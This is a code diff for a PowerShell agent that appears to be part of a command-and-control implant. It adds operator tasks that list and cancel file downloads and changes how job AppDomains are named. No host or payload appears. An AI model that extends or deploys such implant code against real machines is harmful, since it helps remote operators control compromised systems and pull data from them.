@@ -535,7 +535,7 @@ function Get-FilePart {
     function Start-DownloadJob {
         param($ScriptString, $type, $Path, $ResultID, $ChunkSize)
 
-        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
+        $RandName = Split-Path -Path $Path -Leaf
         # create our new AppDomain
         $AppDomain = [AppDomain]::CreateDomain($RandName)
 
@@ -1058,8 +1058,8 @@ function Get-FilePart {
 
             # return the currently running jobs
             elseif($type -eq 50) {
-                $RunningJobs = $Script:Jobs.Keys -join "`n"
-                Encode-Packet -data ("Running Jobs:`n$RunningJobs") -type $type -ResultID $ResultID
+                $Downloads = $Script:Jobs.Keys -join "`n"
+                Encode-Packet -data ("Running Jobs:`n$Downloads") -type $type -ResultID $ResultID
             }
 
             # stop and remove a specific job if it's running
@@ -1077,6 +1077,27 @@ function Get-FilePart {
                 }
                 catch {
                     Encode-Packet -type 0 -data "[!] Error in stopping job: $JobName" -ResultID $JobResultID
+                }
+            }
+
+            #return downloads
+            elseif($type -eq 52) {
+                $RunningDownloads = $Script:Downloads.Keys -join "`n"
+                Encode-Packet -data ("Downloads:`n$RunningDownloads") -type $type -ResultID $ResultID
+            }
+
+            #Cancel a download
+            elseif($type -eq 53) {
+                $JobName = $data
+                $JobResultID = $ResultIDs[$JobName]
+
+                try {
+                    $Results = Stop-DownloadJob -JobName $JobName
+
+                    Encode-Packet -type 53 -data "Download of $JobName stopped" -ResultID $JobResultID
+                }
+                catch {
+                    Encode-Packet -type 0 -data "[!] Error in stopping Download: $JobName" -ResultID $JobResultID
                 }
             }
 
